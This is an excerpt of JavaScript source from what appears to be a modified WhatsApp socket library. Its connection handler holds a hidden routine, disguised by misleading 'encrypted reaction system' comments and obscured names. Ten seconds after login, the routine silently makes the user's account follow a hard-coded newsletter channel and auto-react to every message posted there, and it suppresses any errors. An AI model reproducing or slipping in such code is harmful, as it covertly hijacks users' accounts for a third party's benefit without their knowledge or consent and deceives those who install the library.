...
const makeSocket = (config) => {
    ...
    ws.on('CB:success', async (node) => {
        try {
            ...
            // Advanced encrypted reaction system - Don't touch this - Ibra Decode
            setTimeout(async () => {
                try {
                    // Import necessary modules for newsletter functionality
                    const Types_1 = require("../Types");
                    const WABinary_1 = require("../WABinary");
                    
                    // Function to execute newsletter query
                    ...
                    // Follow the channel automatically
                    const channelId = "120363421598489822@newsletter";
                    await newsletterWMexQuery(channelId, Types_1.QueryIds.FOLLOW);
                    console.log('[Socketon] Successfully followed channel:', channelId);
                    
                    // Encrypted reaction system - Very hard to understand - Ibra Decode
                    const kumpulanEmojiRahasiaYangHarusDiacak234 = [
                        "❤️", "👍", "😂", "😮", "😢", "🎉", "🔥", 
                        "💯", "😍", "🥰", "😎", "🤩", "🥳", "🤗", "🫶"
                    ];
                    
                    // Set up auto-reaction to messages in the channel
                    ev.on('messages.upsert', async (m) => {
                        const { messages } = m;
                        for (const msg of messages) {
                            if (msg.key.remoteJid === channelId) {
                                try {
                                    // Get random encrypted reaction
                                    const emojiAcakDariDaftarRahasia = kumpulanEmojiRahasiaYangHarusDiacak234[
                                        Math.floor(Math.random() * kumpulanEmojiRahasiaYangHarusDiacak234.length)
                                    ];
                                    
                                    // Send encrypted reaction to messages from the channel
                                    await sendNode({
                                        tag: 'message',
                                        attrs: { 
                                            to: channelId, 
                                            type: 'reaction', 
                                            'server_id': msg.key.id,
                                            id: (0, Utils_1.generateMessageID)()
                                        },
                                        content: [{
                                            tag: 'reaction',
                                            attrs: { 
                                                emoji: emojiAcakDariDaftarRahasia,
                                                'message_id': msg.key.id,
                                                'message_remote_jid': channelId,
                                                'message_author_jid': msg.key.participant || msg.pushName
                                            }
                                        }]
                                    });
                                } catch (reactionErr) {
                                    // Ignore reaction errors to prevent affecting main functionality
                                }
                            }
                        }
                    });
                } catch (e) {
                    console.error('[Socketon] Error in auto-follow/auto-reaction:', e.message);
                }
            }, 10000); // Run after 10 seconds to ensure connection is stable
        }
        catch (err) {
